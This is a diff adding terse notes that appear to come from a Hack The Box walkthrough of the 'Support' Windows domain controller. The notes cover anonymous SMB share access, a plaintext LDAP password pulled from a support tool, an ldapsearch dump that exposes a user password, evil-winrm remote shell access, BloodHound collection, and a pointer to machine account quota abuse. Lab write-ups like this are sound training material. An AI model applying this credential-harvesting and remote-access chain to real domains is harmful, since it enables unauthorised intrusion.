@@ -87,3 +87,41 @@ SMB         10.129.141.87   445    DC               IPC$            READ        
 SMB         10.129.141.87   445    DC               NETLOGON                        Logon server share 
 SMB         10.129.141.87   445    DC               support-tools   READ            support staff tools
 SMB         10.129.141.87   445    DC               SYSVOL                          Logon server share 
+
+
+
+smbclient //10.129.141.87/support-tools -N
+
+inside support tools
+
+![alt text](image.png)
+
+plain password
+
+nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+
+support.htb\ldap
+
+nimux ldap 10.129.141.87 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
+
+result: 0 Success
+                                                                                                                        
+┌──(ajp㉿kali)-[~/codeplay/htb/machines/support]
+└─$ ldapsearch -x -H ldap://10.129.141.87 \
+  -D 'ldap@support.htb' \
+  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
+  -b 'DC=support,DC=htb' \
+  -s sub '(objectClass=*)' |  grep info                            
+ y with information about license issuance, for the purpose of tracking and re
+ 298939 for more information.
+info: 
+
+support.htb
+
+Ironside47pleasure40Watchful
+
+evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
+
+ bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.141.87 -c All
+
+ms-DS-MachineAccountQuota
